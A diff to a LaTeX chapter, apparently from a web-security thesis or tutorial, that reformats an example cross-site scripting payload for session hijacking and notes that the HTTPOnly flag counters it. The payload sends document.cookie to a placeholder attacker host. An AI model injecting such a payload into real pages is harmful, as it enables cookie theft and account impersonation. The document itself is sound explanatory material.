@@ -5,7 +5,14 @@ Once the attacker finds a vulnerability has several ways to exploit it. Knowing 
 \subsubsection{Session hijacking attack}
 The goal of this attack is to steal the session cookies to impersonate the user. A payload like this can send the cookies to a remote server controlled by the attacker passing the cookies as a parameter.
 
-\verb|<script>document.InnerHTML += "<img src='http://attackersite.com/?cookie="+ document.cookie + "/'>" </script>|
+\begin{html}
+<script>
+  document.InnerHTML += "<img src='http://attackersite.com/?cookie=" + 
+  document.cookie 
+  + "/'>" 
+</script>
+\end{html}
+
 
 This attack can be easily countered by setting the session cookies with the flag HTTPOnly, that we explained earlier in the cookies chapter.
 
